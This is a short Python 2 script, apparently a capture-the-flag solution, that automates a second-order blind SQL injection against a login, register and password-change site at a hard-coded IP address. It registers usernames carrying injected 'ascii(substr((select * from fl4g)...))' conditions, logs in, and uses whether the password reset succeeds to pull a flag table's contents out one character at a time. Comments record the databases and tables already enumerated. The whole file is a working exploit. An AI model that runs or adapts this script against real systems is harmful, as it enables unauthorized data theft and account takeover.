import requests

index_url = "http://101.71.29.5:10002/index.php"
login_url = "http://101.71.29.5:10002/login.php"
pass_change_url = "http://101.71.29.5:10002/pass_change.php"
register_url = "http://101.71.29.5:10002/login_create.php"
s = requests.Session()
database = ""#mysql,security,sys
version = "5.7.27"
table_name = "emails,referers,uagents,users" #gtid_executed,fl4g,sys

for i in range(1,50):
    for j in range(44,128):
        register_data = {
            "username":"admin' and ascii(substr((select * from fl4g),%d,1))=%d######################somnus1234567890121"%(i,j),
            "password":"123",
            "re_password":"123",
            "submit":"Register"
        }
        r1 = s.post(register_url,data=register_data)
        login_data = {
            "login_user":"admin' and ascii(substr((select * from fl4g),%d,1))=%d######################somnus1234567890121"%(i,j),
            "login_password": "123",
            "mysubmit": "Login"
        }
        r2 = s.post(login_url,data=login_data)
        pass_change_data = {
            "current_password": "123",
            "password": "somnus1" + str(i),
            "re_password": "somnus1" + str(i),
            "submit": "Reset"
        }
        r3 = s.post(pass_change_url, data=pass_change_data)
        if "Password successfully updated" in r3.text:
            database = database + chr(j)
            print database
            break
